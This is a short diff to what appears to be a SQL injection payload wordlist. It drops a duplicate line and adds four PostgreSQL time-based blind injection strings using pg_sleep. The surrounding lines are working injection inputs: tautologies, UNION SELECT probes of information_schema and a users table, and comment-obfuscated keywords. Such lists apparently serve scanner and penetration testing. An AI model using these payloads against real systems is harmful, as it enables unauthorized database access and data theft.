@@ -25,11 +25,14 @@ admin' or '
 ' select * from information_schema.tables--
 ) union select * from information_schema.tables;
 ' union all select @@version--
-' union all select @@version--
 ' union select * from users where login = char(114,111,111,116);
 ' union select 
 '/**/or/**/1/**/=/**/1
 ' or 1/*
 or 1=1--
 uni/**/on sel/**/ect
+1 AND 1=(SELECT 1 FROM pg_sleep(5))-- 
+' AND 1=(SELECT 1 FROM pg_sleep(5))-- 
+1 AND 31337=(SELECT 31337 FROM pg_sleep(5))-- 
+'||(SELECT 1 FROM pg_sleep(5))--
 
